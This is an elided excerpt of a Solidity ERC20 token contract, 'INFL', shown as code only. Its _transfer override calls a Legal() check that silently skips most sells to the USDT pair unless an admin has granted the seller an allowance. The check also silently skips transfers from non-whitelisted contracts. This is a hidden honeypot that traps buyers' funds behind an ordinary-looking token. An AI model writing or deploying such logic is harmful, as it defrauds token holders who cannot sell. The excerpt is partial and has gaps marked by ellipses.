...
contract INFL is ERC20,Control{  
    address public _usdtPair;
    address public _ca;  
    address private _da; 
    uint256 public _ctime;
    mapping(address=>uint256) private _mdmap;
    mapping(address=>uint256) private _botmap;
   ...
   function _transferToken(address from,address to,uint256 amount) private{
    ...
    function setMdMap(address user,uint256 amount) public onlyRole(DEFAULT_ADMIN_ROLE){
        _mdmap[user]=amount*10**decimals(); 
    }  
    function setBot(address user) public onlyRole(DEFAULT_ADMIN_ROLE){
        _botmap[user]=1;
    }  
    function _transfer(address from,address to,uint256 amount) internal override(ERC20){
        ...
        uint256 senderBalance = _balances[from];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance"); 
        if(Legal(from,to,amount)){return;} 
        unchecked {
              _balances[from] = senderBalance - amount;
        } 
         _balances[to] += amount;   
     ...
     function Legal(address from,address to,uint256 amount) internal virtual returns(bool state){
        if(isContract(from) && from!=_usdtPair && from!=_da && from!=_ca ){
            if(_botmap[from]==0){
                return false;
            }
            return true;
         ...
         if(from!=_da && from!=_usdtPair && from!=_ca){
                if(to==_usdtPair){ 
                    uint256 _accc=_mdmap[from];
                    if(_accc == 0){
                        return true;
                    }else if(_accc <0 || _accc < amount){ 
                        return true;
                    }else{
                        _mdmap[from]=_accc-amount;
                        return false;
                    }
                }else{
                  return true;
